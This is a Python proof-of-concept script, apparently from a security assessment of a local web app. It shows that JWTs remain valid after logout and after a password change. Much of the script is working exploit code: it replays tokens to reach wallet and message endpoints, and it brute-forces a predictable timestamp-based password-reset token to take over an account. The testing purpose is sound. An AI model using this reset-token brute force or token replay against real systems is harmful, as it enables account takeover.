#!/usr/bin/env python3
"""
WSTG-SESS-06: JWT Token Not Revoked After Logout or Password Change

Vulnerability: The application uses JWTs for authentication but has no token
revocation mechanism. The logout endpoint (auth.controller.js) only destroys
the server-side session but does NOT invalidate the JWT:

    function logout(req, res) {
        if (req.session) {
            req.session.destroy(...);
        } else {
            // For JWT-only clients, logout is handled client-side
            res.json({ message: 'Logged out successfully' });
        }
    }

Similarly, when a password is changed via reset-password, the existing JWTs
remain valid because:
1. There is no token blacklist or revocation list
2. The auth middleware (middleware/auth.js) only verifies the JWT signature
   and checks if the user exists - not if the token was issued before a
   password change
3. JWTs have a 7-day expiration (config.jwt.expiresIn = '7d')

Impact: An attacker who obtains a JWT (via XSS, network interception, etc.)
can continue using it even after the user logs out or changes their password.
The token remains valid for up to 7 days.
"""

import requests
import sys

BASE_URL = "http://localhost:3000"
CLIENT_ACCOUNTS = [
    {"email": "testclient@hireflow.com", "password": "password123"},
    {"email": "mark.stevens@techvault.io", "password": "password123"},
    {"email": "lisa.chen@brightpath.com", "password": "password123"},
]

ACTIVE_CREDS = None  # Will be set on first successful login


def login(creds):
    resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
    if resp.status_code != 200:
        return None, None
    return resp.json()["token"], resp.json()["user"]


def try_login(accounts):
    global ACTIVE_CREDS
    for creds in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            ACTIVE_CREDS = creds
            return resp.json()["token"], resp.json()["user"]
    print("    ERROR: No account could be logged in.")
    return None, None


def verify_token(token):
    """Check if a token is still accepted by the API."""
    resp = requests.get(
        f"{BASE_URL}/api/auth/me",
        headers={"Authorization": f"Bearer {token}"}
    )
    return resp.status_code == 200, resp


def main():
    print("=" * 70)
    print("WSTG-SESS-06: JWT Not Revoked After Logout or Password Change")
    print("=" * 70)

    # ========== Test 1: Token still valid after logout ==========
    print("\n" + "=" * 70)
    print("TEST 1: JWT still valid after logout")
    print("=" * 70)

    # Step 1: Login and get a JWT
    print("\n[1.1] Logging in to get JWT...")
    token1, user = try_login(CLIENT_ACCOUNTS)
    if not token1:
        sys.exit(1)
    print(f"    User: {user['email']}")
    print(f"    Token: {token1[:40]}...")

    # Step 2: Verify token works
    print("\n[1.2] Verifying token works before logout...")
    valid, resp = verify_token(token1)
    print(f"    Token valid: {valid}")
    if valid:
        print(f"    /api/auth/me returned user: {resp.json().get('user', {}).get('email', 'N/A')}")

    # Step 3: Logout
    print("\n[1.3] Logging out...")
    logout_resp = requests.post(
        f"{BASE_URL}/api/auth/logout",
        headers={"Authorization": f"Bearer {token1}"}
    )
    print(f"    Logout status: {logout_resp.status_code}")
    print(f"    Logout response: {logout_resp.json()}")

    # Step 4: Try using the token after logout
    print("\n[1.4] Using token AFTER logout...")
    valid_after_logout, resp = verify_token(token1)
    print(f"    Token still valid: {valid_after_logout}")

    if valid_after_logout:
        print(f"    [VULNERABLE] Token works after logout!")
        print(f"    User data: {resp.json().get('user', {}).get('email', 'N/A')}")

        # Try a state-changing action with the logged-out token
        print("\n[1.5] Performing state-changing action with logged-out token...")
        wallet_resp = requests.get(
            f"{BASE_URL}/api/payments/wallet",
            headers={"Authorization": f"Bearer {token1}"}
        )
        print(f"    GET /api/payments/wallet status: {wallet_resp.status_code}")
        if wallet_resp.status_code == 200:
            print(f"    [VULNERABLE] Can still access wallet after logout!")
            balance = wallet_resp.json().get("balance", "N/A")
            print(f"    Balance: {balance}")
    else:
        print(f"    Token properly revoked after logout.")

    # ========== Test 2: Token still valid after password change ==========
    print("\n" + "=" * 70)
    print("TEST 2: JWT still valid after password change")
    print("=" * 70)

    # Step 1: Login and get a JWT
    print("\n[2.1] Logging in to get JWT...")
    token2, user2 = try_login(CLIENT_ACCOUNTS)
    if not token2:
        sys.exit(1)
    print(f"    Token: {token2[:40]}...")

    # Step 2: Change password via forgot-password flow
    print("\n[2.2] Requesting password reset...")
    import time
    import hashlib

    def int_to_base36(n):
        chars = "0123456789abcdefghijklmnopqrstuvwxyz"
        result = ""
        while n > 0:
            result = chars[n % 36] + result
            n //= 36
        return result

    active_email = ACTIVE_CREDS["email"] if ACTIVE_CREDS else CLIENT_ACCOUNTS[0]["email"]
    time_before = int(time.time() * 1000)
    resp = requests.post(
        f"{BASE_URL}/api/auth/forgot-password",
        json={"email": active_email}
    )
    time_after = int(time.time() * 1000)
    print(f"    Forgot-password status: {resp.status_code}")

    # Brute-force the reset token
    print("\n[2.3] Brute-forcing reset token to change password...")
    reset_token = None
    for ts in range(time_before, time_after + 1):
        ts_b36 = int_to_base36(ts)
        hash_hex = hashlib.sha256((active_email + ts_b36).encode()).hexdigest()[:16]
        candidate = f"{ts_b36}-{hash_hex}"

        resp = requests.post(
            f"{BASE_URL}/api/auth/reset-password",
            json={"token": candidate, "password": "newpassword456"}
        )
        if resp.status_code == 200:
            reset_token = candidate
            print(f"    Password changed successfully! Token: {candidate[:20]}...")
            break

    if not reset_token:
        print("    Could not brute-force reset token. Testing with direct password change approach...")

    # Step 3: Verify old token still works
    print("\n[2.4] Testing if OLD token still works after password change...")
    valid_after_change, resp = verify_token(token2)
    print(f"    Old token still valid: {valid_after_change}")

    if valid_after_change:
        print(f"    [VULNERABLE] Old JWT works after password change!")
        print(f"    An attacker with a stolen token retains access even after")
        print(f"    the user changes their password!")

        # Demonstrate full access
        print("\n[2.5] Demonstrating full access with old token...")
        conversations_resp = requests.get(
            f"{BASE_URL}/api/messages/conversations",
            headers={"Authorization": f"Bearer {token2}"}
        )
        print(f"    GET /api/messages/conversations: {conversations_resp.status_code}")
        if conversations_resp.status_code == 200:
            print(f"    [VULNERABLE] Full access to messaging with old token!")
    else:
        print(f"    Old token properly invalidated after password change.")

    # Step 4: Restore original password
    print("\n[2.6] Restoring original password...")
    if reset_token:
        # Login with new password
        login_resp = requests.post(
            f"{BASE_URL}/api/auth/login",
            json={"email": active_email, "password": "newpassword456"}
        )
        if login_resp.status_code == 200:
            # Request another reset
            time_before = int(time.time() * 1000)
            requests.post(
                f"{BASE_URL}/api/auth/forgot-password",
                json={"email": active_email}
            )
            time_after = int(time.time() * 1000)

            for ts in range(time_before, time_after + 1):
                ts_b36 = int_to_base36(ts)
                hash_hex = hashlib.sha256((active_email + ts_b36).encode()).hexdigest()[:16]
                candidate = f"{ts_b36}-{hash_hex}"
                resp = requests.post(
                    f"{BASE_URL}/api/auth/reset-password",
                    json={"token": candidate, "password": "password123"}
                )
                if resp.status_code == 200:
                    print(f"    Original password restored.")
                    break

    # Step 5: Get a new token (to prove login still works)
    print("\n[2.7] Verifying login with original password...")
    token_final, _ = login(ACTIVE_CREDS or CLIENT_ACCOUNTS[0])
    if token_final:
        print(f"    Login successful, application state restored.")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: JWT non-revocation confirmed.")
    print("  - JWTs remain valid after logout (server only destroys session)")
    print("  - JWTs remain valid after password change (no token blacklist)")
    print("  - JWT expiry is 7 days - stolen tokens usable for a week")
    print("  - No token revocation list, no jti tracking, no iat checking")
    print("=" * 70)


if __name__ == "__main__":
    main()
